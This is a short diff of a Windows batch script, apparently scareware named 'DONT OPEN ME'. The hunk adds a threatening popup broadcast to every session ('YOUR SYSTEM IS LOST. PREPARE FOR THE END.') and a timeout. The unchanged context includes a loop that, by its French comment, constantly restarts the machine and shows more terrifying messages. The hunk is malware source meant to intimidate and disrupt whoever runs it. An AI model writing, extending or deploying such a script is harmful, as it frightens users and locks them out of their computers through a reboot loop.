@@ -57,6 +57,10 @@ for /l %%i in (1,1,50) do (
     endlocal
 )
 
+:: Première alerte avant redémarrage
+msg * "DONT OPEN ME IS HERE. YOUR SYSTEM IS LOST. PREPARE FOR THE END."
+timeout /t 15 >nul
+
 :: Redémarrage constant avec un message final terrifiant
 :loop
 msg * "DONT OPEN ME IS EVERYWHERE. YOU CAN'T ESCAPE."
